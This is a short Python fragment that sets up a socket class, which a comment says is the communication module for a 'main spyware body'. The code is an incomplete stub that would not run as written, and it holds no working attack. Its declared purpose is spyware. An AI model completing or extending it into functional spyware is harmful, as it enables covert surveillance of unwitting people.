import socket
#establishing standards:
#b'_' acknowledgement
#b'&end' signifys finnishing a transmition
class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
    def __init__(self) -> None:
        self.server = socket.socket()
        self.server.bind()
    def handshake(self):
        self.server.recv(1024)